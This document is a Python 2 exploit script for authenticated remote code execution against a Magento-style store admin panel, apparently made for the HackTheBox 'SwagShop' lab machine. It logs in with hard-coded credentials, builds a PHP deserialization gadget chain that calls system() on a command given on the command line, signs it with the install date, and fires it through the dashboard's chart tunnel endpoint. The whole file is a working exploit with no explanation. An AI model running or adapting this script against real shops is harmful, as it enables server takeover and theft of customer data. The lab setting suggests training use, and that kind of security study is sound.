#!/usr/bin/python

from hashlib import md5
import sys
import re
import base64
import requests


def usage():
    print "Usage: python script.py <target> <argument>\nExample: python script.py http://localhost \"uname -a\""
    sys.exit()

if len(sys.argv) != 3:
	usage()

# Command-line args
target = sys.argv[1]
arg = sys.argv[2]

#Config
username = 'hollow'
password = '123456'
php_function = 'system'
install_date = 'Wed, 08 May 2019 07:23:09 +0000' # curl http://swagshop.htb/app/etc/local.xml | grep date

# POP chain to pivot into call_user_exec
payload = 'O:8:\"Zend_Log\":1:{s:11:\"\00*\00_writers\";a:2:{i:0;O:20:\"Zend_Log_Writer_Mail\":4:{s:16:' \
          '\"\00*\00_eventsToMail\";a:3:{i:0;s:11:\"EXTERMINATE\";i:1;s:12:\"EXTERMINATE!\";i:2;s:15:\"' \
          'EXTERMINATE!!!!\";}s:22:\"\00*\00_subjectPrependText\";N;s:10:\"\00*\00_layout\";O:23:\"'     \
          'Zend_Config_Writer_Yaml\":3:{s:15:\"\00*\00_yamlEncoder\";s:%d:\"%s\";s:17:\"\00*\00'     \
          '_loadedSection\";N;s:10:\"\00*\00_config\";O:13:\"Varien_Object\":1:{s:8:\"\00*\00_data\"' \
          ';s:%d:\"%s\";}}s:8:\"\00*\00_mail\";O:9:\"Zend_Mail\":0:{}}i:1;i:2;}}' % (len(php_function), php_function,
                                                                                     len(arg), arg)

s = requests.session()
data = { 'login[username]': username, 'login[password]': password, 'form_key': 'V7OYeZx3N4WQva7b', 'dummy': ''}

res = s.post(target, data=data)
content = res.content
url = re.search("ajaxBlockUrl = \'(.*)\'", content)
url = url.group(1)
key = re.search("var FORM_KEY = '(.*)'", content)
key = key.group(1)

data = {'isAjax': 'false', 'form_key': key}
request = s.post(url + 'block/tab_orders/period/7d/?isAjax=true', data=data)
res = request.content
tunnel = re.search("src=\"(.*)\?ga=", request.content)
tunnel = tunnel.group(1)

payload = base64.b64encode(payload)
gh = md5(payload + install_date).hexdigest()

exploit = tunnel + '?ga=' + payload + '&h=' + gh

req = s.get(exploit)
print req.content
